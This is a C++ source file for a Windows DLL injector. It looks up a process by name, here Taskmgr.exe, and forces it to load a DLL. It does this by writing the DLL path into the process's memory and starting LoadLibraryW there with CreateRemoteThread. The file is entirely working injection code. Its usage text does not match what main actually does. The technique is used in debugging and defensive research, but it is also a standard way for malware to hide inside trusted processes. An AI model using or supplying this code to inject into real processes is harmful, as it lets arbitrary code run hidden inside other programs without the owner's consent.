/*
Written by: SaEeD
Description: Injecting DLL to Target process using Process Id or Process name
Repo: https://github.com/saeedirha/DLL-Injector
*/
#include <iostream>
#include <string>
#include <ctype.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <Shlwapi.h>
#include <fcntl.h>
//Library needed by Linker to check file existance
#pragma comment(lib, "Shlwapi.lib")

using namespace std;

int getProcID(const wstring &p_name);
bool InjectDLL(const int &pid, const wstring &DLL_Path);
void usage();

int main(int argc, char **argv)
{
	wchar_t full_path[MAX_PATH];
     _setmode(_fileno(stdout), _O_U16TEXT);
	GetFullPathNameW(L"dllmain.dll",MAX_PATH,full_path,NULL);
	if (PathFileExistsW(full_path) == FALSE)
	{
		cerr << "[!]DLL file does NOT exist!" << endl;
		system("pause");
		return EXIT_FAILURE;
	}
	wcout << "[+]DLL Path:  " << full_path << endl;
	InjectDLL(getProcID(L"Taskmgr.exe"), full_path);
	system("pause");
		return EXIT_SUCCESS;
}
//-----------------------------------------------------------
// Get Process ID by its name
//-----------------------------------------------------------
int getProcID(const wstring &p_name)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W structprocsnapshot = {0};

	structprocsnapshot.dwSize = sizeof(PROCESSENTRY32W);

	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;
	if (Process32FirstW(snapshot, &structprocsnapshot) == FALSE)
		return 0;
	while (Process32NextW(snapshot, &structprocsnapshot))
	{
		if (!wcscmp(structprocsnapshot.szExeFile, p_name.c_str()))
		{
			CloseHandle(snapshot);
			wcout << L"[+]Process name is: " << p_name << L"\n[+]Process ID: " << structprocsnapshot.th32ProcessID << endl;
			return structprocsnapshot.th32ProcessID;
		}
	}
	CloseHandle(snapshot);
	cerr << "[!]Unable to find Process ID" << endl;
	return 0;
}
//-----------------------------------------------------------
// Inject DLL to target process
//-----------------------------------------------------------
bool InjectDLL(const int &pid, const wstring &DLL_Path)
{

	long dll_size = DLL_Path.size()*sizeof(wchar_t) + sizeof(wchar_t);
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (hProc == NULL)
	{
		cerr << "[!]Fail to open target process!" << endl;
		return false;
	}
	cout << "[+]Opening Target Process..." << endl;

	LPVOID MyAlloc = VirtualAllocEx(hProc, NULL, dll_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (MyAlloc == NULL)
	{
		cerr << "[!]Fail to allocate memory in Target Process." << endl;
		return false;
	}

	cout << "[+]Allocating memory in Target Process." << endl;
	int IsWriteOK = WriteProcessMemory(hProc, MyAlloc, DLL_Path.c_str(), dll_size, 0);
	if (IsWriteOK == 0)
	{
		cerr << "[!]Fail to write in Target Process memory." << endl;
		return false;
	}
	cout << "[+]Creating Remote Thread in Target Process" << endl;

	DWORD dWord;
	LPTHREAD_START_ROUTINE addrLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(LoadLibraryW(L"kernel32"), "LoadLibraryW");
	HANDLE ThreadReturn = CreateRemoteThread(hProc, NULL, 0, addrLoadLibrary, MyAlloc, 0, &dWord);
	if (ThreadReturn == NULL)
	{
		cerr << "[!]Fail to create Remote Thread" << endl;
		return false;
	}

	if ((hProc != NULL) && (MyAlloc != NULL) && (IsWriteOK != ERROR_INVALID_HANDLE) && (ThreadReturn != NULL))
	{
		cout << "[+]DLL Successfully Injected :)" << endl;
		return true;
	}

	return false;
}
//-----------------------------------------------------------
// Usage help
//-----------------------------------------------------------
void usage()
{
	cout << "Usage: DLL_Injector.exe <Process name | Process ID> <DLL Path to Inject>" << endl;
}